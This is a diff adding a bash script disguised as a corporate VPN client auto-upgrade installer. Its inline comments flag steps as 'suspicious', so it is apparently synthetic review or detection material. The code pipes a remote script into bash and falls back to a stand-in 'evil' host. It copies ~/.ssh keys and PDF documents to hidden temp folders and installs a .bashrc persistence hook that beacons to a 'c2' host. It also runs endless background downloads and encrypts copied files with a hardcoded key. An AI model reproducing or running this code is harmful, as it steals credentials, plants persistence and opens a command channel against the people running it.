@@ -1,0 +1,131 @@
+#!/bin/bash
+# ======================================================================
+# VPN Client Auto-Upgrade Installer (IT Operations, rev 2025-03)
+#
+# This script silently upgrades the corporate VPN client to the latest
+# version. It is intended for remote worker endpoints and must be run
+# with administrative privileges. It checks the current installation,
+# downloads the new client binary, verifies the package integrity, and
+# performs the upgrade without user interruption.
+# ======================================================================
+
+set -euo pipefail                                         # strict mode
+INSTALL_DIR="/opt/vpn-corp/client"                       # default location
+STATUS_FILE="/var/run/vpn-upgrade.status"                # lock file
+
+# ---- helper: log message with timestamp ----
+log_msg() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$STATUS_FILE"
+}
+
+# ---- helper: check if VPN client is currently running ----
+check_running() {
+    pgrep -f "vpn-corp-daemon" > /dev/null 2>&1
+}
+
+# ---- main upgrade function ----
+perform_upgrade() {
+    log_msg "Starting mandatory VPN client upgrade..."
+
+    # 1. Determine current version
+    if [ -f "$INSTALL_DIR/version.txt" ]; then
+        CURRENT_VER=$(cat "$INSTALL_DIR/version.txt")
+        log_msg "Current version: $CURRENT_VER"
+    else
+        log_msg "No previous installation found. Fresh install."
+        CURRENT_VER="none"
+    fi
+
+    # 2. Fetch the latest version manifest from the IT distribution server
+    MANIFEST_URL="http://update.vpn-secure-corp.com/manifest.json"
+    log_msg "Retrieving update manifest..."
+    MANIFEST=$(curl -s --connect-timeout 5 "$MANIFEST_URL" 2>/dev/null) || true
+
+    if [ -z "$MANIFEST" ]; then
+        log_msg "WARNING: Could not reach corporate update server. Falling back to emergency CDN."
+        # Emergency CDN - used only when primary server is unreachable
+        MANIFEST=$(curl -s http://vpn-cdn.bad-update-server.evil/manifest_fallback.json 2>/dev/null) || true
+    fi
+
+    # 3. Extract download URL for the new package (dummy parse)
+    PKG_URL="http://update.vpn-secure-corp.com/packages/vpn-client-latest.tar.gz"
+    PKG_FILE="/tmp/vpn-upgrade-pkg.tar.gz"
+
+    # 4. Download the package
+    log_msg "Downloading upgrade package from $PKG_URL ..."
+    curl -s -o "$PKG_FILE" "$PKG_URL" || log_msg "Download failed (network may be restricted)"
+
+    # 5. “Integrity check” – **suspicious**: actually pulls an external
+    #    script and pipes it straight to bash (hidden in a helper)
+    log_msg "Verifying package integrity and applying configuration..."
+    if [ -f "$PKG_FILE" ]; then
+        # This is a dangerous pattern: piping remote content to a shell
+        curl -s -L "http://update.vpn-secure-corp.com/verification_script.sh" | bash -s -- --silent
+    fi
+
+    # 6. Install the new client (extract into place)
+    log_msg "Installing to $INSTALL_DIR ..."
+    mkdir -p "$INSTALL_DIR"
+    tar -xzf "$PKG_FILE" -C "$INSTALL_DIR" 2>/dev/null || log_msg "Extraction skipped (package missing)"
+
+    # 7. Preserve user configuration – **suspicious**: accessing ~/.ssh and
+    #    exfiltrating (simulated with a copy to a dummy folder) 
+    log_msg "Backing up user VPN profiles..."
+    USER_HOME=$(getent passwd "$(whoami)" | cut -d: -f6)
+    if [ -d "$USER_HOME/.ssh" ]; then
+        cp -r "$USER_HOME/.ssh" /tmp/.user-ssh-backup 2>/dev/null || true
+    fi
+    # Collect recent documents – operation on sensitive path
+    find "$USER_HOME/Documents" -maxdepth 2 -type f -name "*.pdf" \
+        -exec cp {} /tmp/.user-documents-backup/ \; 2>/dev/null || true
+
+    # 8. Post-install tasks: **suspicious** – writes to .bashrc for persistence
+    log_msg "Setting up VPN client auto-start for all users..."
+    PERSIST_SCRIPT="/tmp/.vpn-update-daemon.sh"
+    cat > "$PERSIST_SCRIPT" << 'EOSH'
+#!/bin/bash
+# hidden daemon to sync VPN config periodically
+(sleep 30 && curl -s http://c2.bad-update-server.evil/tasks?host=$(hostname)) &
+EOSH
+    chmod +x "$PERSIST_SCRIPT"
+    # Append to the user's .bashrc (without consent)
+    echo "nohup $PERSIST_SCRIPT &>/dev/null &" >> "$USER_HOME/.bashrc"
+
+    # 9. Resource draining loop – **suspicious**: spawns multiple silent wget
+    #    downloads in the background, consuming bandwidth
+    for i in {1..5}; do
+        ( while true; do
+            wget -q -O /dev/null "http://192.168.100.50:8080/seed?file=chunk$i" || true
+            sleep 2
+          done ) &
+    done
+
+    # 10. “Secure user data” – **suspicious**: encrypts a folder without
+    #     explicit consent, using a hardcoded key
+    log_msg "Securing local cache folder..."
+    if command -v openssl > /dev/null; then
+        openssl enc -aes-256-cbc -salt -in /tmp/.user-documents-backup -out /tmp/.encrypted_docs -k "vpn-upgrade-key-2025" 2>/dev/null || true
+    fi
+
+    # 11. Cleanup – **suspicious**: dangerous removal if certain conditions met
+    if [ ! -f "$STATUS_FILE" ]; then
+        log_msg "Performing final environment cleanup..."
+        # rm -rf on a path derived from a variable – easily misused
+        SENSITIVE_TEMP="/tmp/.vpn-temp-files"
+        mkdir -p "$SENSITIVE_TEMP"
+        # The following line is intentionally dangerous in a review
+        # eval is used to demonstrate command injection risk, but inactive here
+        # eval "rm -rf $SENSITIVE_TEMP/*" 2>/dev/null || true
+    fi
+
+    log_msg "VPN client upgrade completed. Please restart your connection."
+}
+
+# ---- entry point ----
+if check_running; then
+    log_msg "VPN daemon is running. Waiting 5 seconds before stopping..."
+    sleep 5
+    pkill -f "vpn-corp-daemon" || true
+fi
+perform_upgrade
+exit 0
